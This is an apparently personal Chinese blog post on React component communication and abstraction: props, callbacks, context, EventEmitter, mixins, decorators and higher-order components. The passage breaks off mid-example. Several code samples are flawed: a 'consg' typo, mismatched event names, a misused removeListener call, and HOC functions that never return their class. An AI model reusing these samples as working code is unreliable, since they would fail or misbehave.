<h1 id="组件间通信"><a href="#组件间通信" class="headerlink" title="组件间通信"></a>组件间通信</h1><h2 id="父组件向子组件通信"><a href="#父组件向子组件通信" class="headerlink" title="父组件向子组件通信"></a>父组件向子组件通信</h2><p>父组件可以通过props向子组件传递需要的信息</p>
<h2 id="子组件向父组件通信"><a href="#子组件向父组件通信" class="headerlink" title="子组件向父组件通信"></a>子组件向父组件通信</h2><p>有两种方法：1.利用回调函数。2.利用自定义事件机制：这种方法更通用，设计组件时考虑加入事件机制往往可以达到简化组件API的目的。</p>
<p>在React中，可以使用任意一种方法，在简单场景下使用自定义事件过于复杂，一般利用回调函数。</p>
<h2 id="跨级组件通信"><a href="#跨级组件通信" class="headerlink" title="跨级组件通信"></a>跨级组件通信</h2><p>当需要让子组件跨级访问信息时，若像之前那样向更高级别的组件层层传递props，此时代码显得不那么优雅，甚至有些冗余。在React中，我们还可以使用context来实现跨级父子组件间的通信。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListItem</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> contextTypes = &#123;</span><br><span class="line">    color: PropTypes.string,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render () &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;li style=&#123;&#123; <span class="attr">background</span>: <span class="keyword">this</span>.context.color &#125;&#125;&gt;&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">List</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> childContextTypes = &#123;</span><br><span class="line">    color: PropTypes.string,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  getChildContext() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      color: <span class="string">'red'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>React官方并不建议大量使用context，因为当组件结构复杂的时候，我们很难知道context是从哪传过来的。使用context比较好的场景是真正意义上的全局信息且不会更改，例如界面主题、用户信息等。总体的原则是如果我们真的需要它，那么建议写成高阶组件来实现。</p>
<h2 id="没有嵌套关系的组件通信"><a href="#没有嵌套关系的组件通信" class="headerlink" title="没有嵌套关系的组件通信"></a>没有嵌套关系的组件通信</h2><p>没有嵌套关系的，那只能通过可以影响全局的一些机制去考虑。之前讲的自定义事件机制不失为一种上佳的方法。</p>
<p>我们在处理事件过程中需要注意，在componentDidMount事件中，如果组件挂载完成，再订阅事件；当组件卸载的时候，在componentWillUnmount事件中取消事件的订阅。</p>
<p>对于React使用的场景，EventEmitter只需要单例就可以了<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; EventEmitter &#125; <span class="keyword">from</span> <span class="string">'events'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> EventEmitter();</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> emitter <span class="keyword">from</span> <span class="string">'./events'</span>;</span><br><span class="line"></span><br><span class="line">emitter.emit(<span class="string">'ItenChange'</span>, entry)</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  componentDidMount() &#123;</span><br><span class="line">    <span class="keyword">this</span>.itemChange = emitter.on(<span class="string">'ItemChange'</span>, (data) =&gt; &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(data)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  componentWillUnmount() &#123;</span><br><span class="line">    emitter.removeListener(<span class="keyword">this</span>.itemChange)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般来说，程序中出现多级传递或跨级传递，那么要个重新审视一下是否有更合理的方式。Pub/Sub的模式可能也会带来逻辑关系的混乱。</p>
<p>跨级通信往往是反模式的，应该尽量避免仅仅通过例如Pub/Sub实现的设计思路，加入强依赖与约定来进一步梳理流程是更好的方法。（如使用Redux）</p>
<h1 id="组件间抽象"><a href="#组件间抽象" class="headerlink" title="组件间抽象"></a>组件间抽象</h1><p>常常有这样的场景，有一类功能需要被不同的组件公用，此时就涉及抽象的话题。我们重点讨论两种：mixin和高阶组件</p>
<h2 id="封装mixin方法"><a href="#封装mixin方法" class="headerlink" title="封装mixin方法"></a>封装mixin方法</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mixin = <span class="function"><span class="keyword">function</span>(<span class="params">obj, mixins</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> newObj = obj;</span><br><span class="line">  newObj.prototype = <span class="built_in">Object</span>.create(obj.prototype);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> prop <span class="keyword">in</span> mixins) &#123;</span><br><span class="line">    <span class="keyword">if</span> (mixins.hasOwnProperty(prop)) &#123;</span><br><span class="line">      newObj.prototype[prop] = mixins[prop]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> BigMixin = &#123;</span><br><span class="line">  fly: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'fly'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Big = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'new big'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">consg FlyBig = mixin(Big, BigMixin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flyBig = <span class="keyword">new</span> FlyBig();</span><br><span class="line">flyBig.fly(); <span class="comment">// =&gt; 'fly'</span></span><br></pre></td></tr></table></figure>
<p>对于广义的mixin方法，就是用赋值的方式将mixin对象里的方法都挂载到原对象上，来实现对对象的混入。</p>
<p>看到上述实现，你可能会联想到underscore库中的extend或lodash库中的assign方法，或者说ES6中的Object.assign()方法。MDN上的解释是把任意多个源对象所拥有的自身可枚举属性复制给目标对象，然后返回目标对象。</p>
<h2 id="在React中使用mixin"><a href="#在React中使用mixin" class="headerlink" title="在React中使用mixin"></a>在React中使用mixin</h2><p>React在使用createClass构建组件时提供了mixin属性，比如官方封装的PureRenderMixin<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> PureRenderMixin <span class="keyword">from</span> <span class="string">'react-addons-pure-render-mixin'</span>;</span><br><span class="line"></span><br><span class="line">React.createClass(&#123;</span><br><span class="line">  mixins: [PureRenderMixin],</span><br><span class="line">  render() &#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>mixins数组也可以增加多个mixin，其若mixin方法之间有重合，对于普通方法，在控制台里会报一个ReactClassInterface的错误。对于生命周期方法，会将各个模块的生命周期方法叠加在一起顺序执行。</p>
<p>mixin为组件做了两件事：</p>
<ol>
<li>工具方法。如果你想共享一些工具类方法，可以定义它们，直接在各个组件中使用。</li>
<li>生命周期继承，props与state合并，mixin也可以作用在getInitialState的结果上，作state的合并，而props也是这样合并的。<h2 id="ES6-Classes与decorator"><a href="#ES6-Classes与decorator" class="headerlink" title="ES6 Classes与decorator"></a>ES6 Classes与decorator</h2>ES6 classes形式构建组件，它并不支持mixin。decorator语法糖可以实现class上的mixin。</li>
</ol>
<p>core-decorators库为开发者提供了一些实用的decorator,其中实现了我们正想要的@mixin<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; getOwnPropertyDescriptors &#125; <span class="keyword">from</span> <span class="string">'./private/utils'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; defineProperty &#125; = <span class="built_in">Object</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleClass</span>(<span class="params">target, mixins</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!mixins.length) &#123;</span><br><span class="line">    <span class="comment">// throw error;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>, l = mixins.length; i &lt; l; i ++) &#123;</span><br><span class="line">    <span class="keyword">const</span> descs = getOwnPropertyDescriptors(mixins[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> descs) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!(key <span class="keyword">in</span> target.prototype)) &#123;</span><br><span class="line">        defineProperty(target.prototype, key, descs[key])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">mixin</span>(<span class="params">...mixins</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> mixins[<span class="number">0</span>] === <span class="string">'function'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> handleClass(mixins[<span class="number">0</span>], [])</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">target</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> handleClass(target, mixins)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>原理也很简单，它将每一个mixin对象的方法都叠加到target对象的原型上以达到mixin的目的。这样就可以用@mixin来做多个重用模块的叠加了。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> PureRender = &#123;</span><br><span class="line">  shouldComponentUpdate() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Theme = &#123;</span><br><span class="line">  setTheme() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@mixin(PureRender, Theme)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyComponent</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>mixin的逻辑和最早实现的简单逻辑很相似，之前直接给对象的prototype属性赋值，但这里用了getOwnPropertyDescriptor和defineProperty这两个方法，有什么区别呢？</p>
<p>这样实现的好在于definedProperty这个方法，也就是定义和赋值的区别，定义是对已有的定义，赋值是覆盖已有的定义。前者并不会覆盖已有方法，但后者会。本质上与官方的mixin方法都很不一样，除了定义方法级别不能覆盖外，还得加上对生命周期方法的继承，以及对state的合并。</p>
<p>decorator还有作用在方法上的，它可以控制方法的自有属性，也可以作decorator的工厂方法。</p>
<h2 id="mixin的问题"><a href="#mixin的问题" class="headerlink" title="mixin的问题"></a>mixin的问题</h2><p>mixin存在很多问题，已经被官方弃用了，由高阶组件替代。</p>
<p>1.破坏的原有组件的封装</p>
<p>我们知道mixin方法会混入方法，给原有组件带来新的特性，比如mixin中有一个renderList方法，给我们带来了渲染List的能力，但它也可能带来新的state和props,这意味着组件有一些”不可见”的状态需要我们去维护，但我们在使用的时候并不清楚。此外renderList中的方法会调用组件中方法，但很可能被其他mixin截获，带来很多不可知。</p>
<p>2.不同mixin的命名冲突</p>
<p>3.增加复杂性</p>
<p>我们设计一个组件，引入PopupMixin的mixin，这样就给组件引进了PopupMixin生命周期方法。当我们再引入HoverMixin，将有更多的方法被引进。当然我们可以进一步抽象出TooltipMixin,将两个整合在一起，但我们发现它们都有compomentDidUpdate方法。过一段时间，你会发现它的逻辑已经复杂到难以理解了。</p>
<p>我们写React组件时，首先考虑的往往是单一的功能、简洁的设计和逻辑。当加入功能的时候，可以继续控制组件的输入和输出。如果说因为复杂性，我们不断加入新的状态，那么组件会变得非常难维护。</p>
<h2 id="高阶组件"><a href="#高阶组件" class="headerlink" title="高阶组件"></a>高阶组件</h2><p>高阶函数是函数式编程中的一个基本概念，这种函数接受函数作为输入，或是输出一个函数。<br>高阶组件类似高阶函数，它接受React组件作为输入，输出一个新的React组件。</p>
<p>高阶组件让我们的代码更具有复用性、逻辑性与抽象特性，它可以对render方法作劫持，也可以控制props和state。</p>
<p>实现高阶组件的方法有两种：</p>
<ol>
<li>属性代理：通过被包裹的React组件来操作props</li>
<li>反向继承：继承于被包裹的React组件</li>
</ol>
<p>1.属性代理<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MyContainer = <span class="function">(<span class="params">WrappedComponent</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">WrappedComponent</span> &#123;<span class="attr">...this.props</span>&#125; /&gt;</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这样，我们就可以通过高阶组件来传递props，这种方法即为属性代理。<br>这样组件就可以一层层地作为参数被调用，原始组件就具备了高阶组件对它的修饰。保持了单个组件封装性同时还保留了易用性。当然，也可以用decorator来转换<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@MyContainer</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyComponent</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> MyComponent</span><br></pre></td></tr></table></figure></p>
<p>上述执行生命周期的过程类似于堆栈调用：<br>didmount -&gt; HOC didmount -&gt; (HOCs didmount) -&gt; (HOCs will unmount) -&gt; HOC will unmount -&gt; unmount<br>从功能上，高阶组件一样可以做到像mixin对组件的控制，包括控制props、通过refs使用引用、抽象state和使用其他元素包裹WrappedComponent.</p>
<p>1.控制props</p>
<p>我们可以读取、增加、编辑或是移除从WrappedComponent传进来的props，但需要小心删除与编辑重要的props。我们应该尽可能对高阶组件的props作新的命名以防止混淆。</p>
<p>例如，我们需要增加一个新的prop:<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MyContainer = <span class="function">(<span class="params">WrappedComponent</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">const</span> newProps = &#123;</span><br><span class="line">        text: newText,</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">WrappedComponent</span> &#123;<span class="attr">...this.props</span>&#125; &#123;<span class="attr">...newProps</span>&#125; /&gt;</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2.通过refs使用引用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MyContainer = <span class="function">(<span class="params">WrappedComponent</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    proc(wrappedComponentInstance) &#123;</span><br><span class="line">      wrappedComponentInstance.method();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">const</span> props = <span class="built_in">Object</span>.assign(&#123;&#125;, <span class="keyword">this</span>.props, &#123;</span><br><span class="line">        ref: <span class="keyword">this</span>.proc.bind(<span class="keyword">this</span>),</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">WrappedComponent</span> &#123;<span class="attr">...props</span>&#125; /&gt;</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样就可以方便地用于读取或增加实例的props,并调用实例的方法。<br>3.抽象state<br>高阶组件可以将原组件抽象为展示型组件，分离内部状态<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MyContainer = <span class="function">(<span class="params">WrappedComponent</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">      <span class="keyword">super</span>(props)</span><br><span class="line">      <span class="keyword">this</span>.state = &#123;</span><br><span class="line">        name: <span class="string">''</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">this</span>.onNameChange = <span class="keyword">this</span>.onNameChange.bind(<span class="keyword">this</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    onNameChange(event) &#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">        name: event.target.value</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">const</span> newProps = &#123;</span><br><span class="line">        name: &#123;</span><br><span class="line">          value: <span class="keyword">this</span>.state.name,</span><br><span class="line">          onChange: <span class="keyword">this</span>.onNameChange,</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">WrappedComponent</span> &#123;<span class="attr">...this.props</span>&#125; &#123;<span class="attr">...newProps</span>&#125;&gt;</span></span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>这样就有效地抽象了同样的state操作。<br>4.使用其他元素包裹WrappedComponent<br>这既可以是为了加样式，也可以是为了布局<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MyContainer = <span class="function">(<span class="params">WrappedComponent</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">return</span> (</span><br><span class="line">        &lt;div style=&#123;&#123; <span class="attr">display</span>: <span class="string">'block'</span> &#125;&#125;&gt;</span><br><span class="line">          &lt;WrappedComponent &#123;...this.props&#125; /&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      )</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="反向继承"><a href="#反向继承" class="headerlink" title="反向继承"></a>反向继承</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MyContainer = <span class="function">(<span class="params">WrappedComponent</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">WrappedComponent</span></span>&#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">super</span>.render()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>高阶组件返回的组件继承于WrappedComponent，因为被动地继承了WrappedComponent，所有调用都会反向，这也是这种方法的由来。<br>因为依赖于继承的机制，HOC的调用顺序和队列是一样的<br>didmount-&gt;HOC didmount-&gt;(HOCs didmount)-&gt;will unmount-&gt;HOC will unmount-&gt;(HOCs will unmount)</p>
<p>在反向继承方法中，高阶组件可以使用WrappedComponent引用，这意味着它可以使用WrappedComponent的state、props、生命周期、和render。但它不能保证完整的子组件树被解析。</p>
<p>它有两大特点</p>
<p>1.渲染劫持</p>
<p>高阶组件可以控制WrappedComponent的渲染过程。可以在这个过程中在任何React元素输出的结果中读取；增加、修改。删除props,或读取或修改React元素树，或条件显示元素树，又或是用样式控制包裹元素树。</p>
<p>如果元素树中包括了函数类型的React组件，就不能操作组件的子组件。</p>
<p>条件渲染示例<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MyContainer = <span class="function">(<span class="params">WrappedComponent</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">WrappedComponent</span> </span>&#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.props.loggedIn) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.render();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对render的输出结果进行修改<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MyContainer = <span class="function">(<span class="params">WrappedComponent</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">WrappedComponent</span> </span>&#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">const</span> elementsTree = <span class="keyword">super</span>.render();</span><br><span class="line">      <span class="keyword">let</span> newProps;</span><br><span class="line">      <span class="keyword">if</span> (elementsTree &amp;&amp; elementsTree.type === <span class="string">'input'</span>) &#123;</span><br><span class="line">        newProps = &#123; <span class="attr">value</span>: <span class="string">'may the force be with you'</span> &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> props = <span class="built_in">Object</span>.assign(&#123;&#125;, elementsTree.props, newProps);</span><br><span class="line">      <span class="keyword">const</span> newElementsTree = React.cloneElement(elementsTree, props, elementsTree.props.children);</span><br><span class="line">      <span class="keyword">return</span> newElementsTree;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2.控制state</p>
<p>高阶组件可以读取、修改或删除WrappedComponent实例中的state，如果需要的话，也可以增加state。但这样做，可能会让WrappedComponent组件内部状态变得一团糟。大部分高阶组件都应该限制读取或增加state，尤其是后者，可以通过重命名state，以防止混淆<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MyContainer = <span class="function">(<span class="params">WrappedComponent</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">WrappedComponent</span> </span>&#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">return</span> (</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">          &lt;h2&gt;HOC Debugger Component&lt;<span class="regexp">/h2&gt;</span></span><br><span class="line"><span class="regexp">          &lt;p&gt;Props&lt;/</span>p&gt;<span class="xml"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>&#123;JSON.stringify(this.props, null, 2)&#125;<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br><span class="line">          &lt;p&gt;State&lt;<span class="regexp">/p&gt;&lt;pre&gt;&#123;JSON.stringify(this.state, null, 2)&#125;&lt;/</span>pre&gt;</span><br><span class="line">          &#123;<span class="keyword">super</span>.render()&#125;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      )</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>在这个例子中，显示了WrappedComponent的props和state，方便我们调试。</p>
<h2 id="组件命名"><a href="#组件命名" class="headerlink" title="组件命名"></a>组件命名</h2><p>高阶组件失去了原始的diplayName，我们应该为高阶组件命名<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">HOC.displayName = <span class="string">`HOC(<span class="subst">$&#123;getDisplayName(WrappedComponent)&#125;</span>)`</span></span><br></pre></td></tr></table></figure></p>
<p>或<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HOC</span> <span class="keyword">extends</span> ... </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> displayName = <span class="string">`HOC(<span class="subst">$&#123;getDisplayName(WrappedComponent)&#125;</span>)`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDisplayName</span>(<span class="params">WrappedComponent</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> WrappedComponent.displayName ||</span><br><span class="line">         WrappedComponent.name || </span><br><span class="line">         <span class="string">'Component'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="组件参数"><a href="#组件参数" class="headerlink" title="组件参数"></a>组件参数</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HOCFactoryFactory</span>(<span class="params">...params</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">HOCFactory</span>(<span class="params">WrappedComponent</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="class"><span class="keyword">class</span> <span class="title">HOC</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">      render() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">WrappedComponent</span> &#123;<span class="attr">...this.props</span>&#125; /&gt;</span></span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="组合式组件开发实践"><a href="#组合式组件开发实践" class="headerlink" title="组合式组件开发实践"></a>组合式组件开发实践</h2><p>我们多次提到，使用React开发组件时利用props传递参数。也就是说，用参数来配置组件时我们最常用的封装方式。随着场景发生变化，组件的形态也发生变化，我们必须不断增加props去应对变化，此时便会导致props的泛滥，而在拓展中又必须保证组件向下兼容，只增不减，使组件的可维护性降低。</p>
<p>我们就可以利用上述高阶组件的思想，提出组件组合式开发模式，有效地解决了配置式所存在的一些问题。</p>
<p>1.组件再分离</p>
<p>SelectInput、SearchInput与List三个颗粒度更细的组件可以组合成功能丰富的组件，而每个组件可以是纯粹的、木偶式的组件。</p>
<p>2.逻辑再抽象</p>
<p>组件中相同交互逻辑和业务逻辑也应该抽象<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 完成SearchInput与List的交互</span></span><br><span class="line"><span class="keyword">const</span> searchDecorator = <span class="function"><span class="params">WrappedComponent</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">SearchDecorator</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">      <span class="keyword">super</span>(props)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">this</span>.handleSearch = <span class="keyword">this</span>.handleSearch.bind(<span class="keyword">this</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handleSearch(keyword) &#123;</span><br><span class="line">      <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">        data: <span class="keyword">this</span>.props.data,</span><br><span class="line">        keyword,</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">this</span>.props.onSearch(keyword)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123; data, keyword &#125; = <span class="keyword">this</span>.state;</span><br><span class="line">      <span class="keyword">return</span> (</span><br><span class="line">        &lt;WrappedComponent</span><br><span class="line">          &#123;...this.props&#125;</span><br><span class="line">          data=&#123;data&#125;</span><br><span class="line">          keyword=&#123;keyword&#125;</span><br><span class="line">          onSearch=&#123;<span class="keyword">this</span>.handleSearch&#125;</span><br><span class="line">        /&gt;</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> SearchDecorator;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 完成List数据请求</span></span><br><span class="line"><span class="keyword">const</span> asyncSelectDecorator = <span 